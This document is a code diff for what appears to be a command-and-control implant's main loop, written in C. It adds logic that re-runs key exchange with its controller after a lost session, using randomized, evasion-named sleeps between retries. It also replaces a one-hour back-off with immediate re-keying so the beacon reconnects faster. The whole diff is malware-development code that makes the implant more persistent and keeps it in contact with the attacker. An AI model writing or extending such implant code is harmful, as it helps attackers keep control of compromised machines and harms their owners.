@@ -715,6 +715,31 @@ void agent_run(AgentState *state) {
             }
         }
 
+        /* If we lost the session key, re-do key exchange before check-in */
+        if (!state->has_session_key) {
+            DBG("[run] no session key — attempting key exchange");
+            int kex_retries = 0;
+            while (!agent_key_exchange(state)) {
+                kex_retries++;
+                if (kex_retries > 10) {
+                    DBG("[run] key exchange failed %d times, backing off 60s", kex_retries);
+                    kex_retries = 0;
+                    evasion_sleep_obfuscated(60000);
+                    if (!state->running) break;
+                    continue;
+                }
+                DBG("[run] key exchange attempt %d failed, retry in 5-10s", kex_retries);
+                evasion_sleep_obfuscated(5000 + (rand() % 5000));
+                if (!state->running) break;
+            }
+            if (!state->running) break;
+            if (state->has_session_key) {
+                DBG("[run] key exchange succeeded — resuming check-ins");
+                consecutive_checkin_failures = 0;
+            }
+            continue;
+        }
+
         /* Check in (with channel fallback on failure) */
         if (!agent_checkin(state)) {
             consecutive_checkin_failures++;
@@ -729,15 +754,18 @@ void agent_run(AgentState *state) {
                 continue;  /* Retry immediately (skip normal sleep) */
             }
 
-            /* Exhausted retries — try channel fallback */
-            if (!channel_try_fallback()) {
-                /* All channels exhausted — extended sleep, then reset retries */
-                DBG("[run] all channels exhausted, sleeping 1 hour");
-                evasion_sleep_obfuscated(3600000); /* 1 hour */
-                consecutive_checkin_failures = 0;  /* Reset to try again */
-                continue;
-            }
+            /*
+             * Exhausted check-in retries — server likely restarted and lost
+             * our session key.  Invalidate the session and re-key on next
+             * iteration instead of sleeping for an hour.
+             */
+            DBG("[run] %d consecutive failures — invalidating session, will re-key",
+                consecutive_checkin_failures);
+            SecureZeroMemory(state->session_key, KEY_SIZE);
+            state->has_session_key = FALSE;
+            state->nonce_counter = 0;
             consecutive_checkin_failures = 0;
+            continue;
         } else {
             consecutive_checkin_failures = 0;
         }
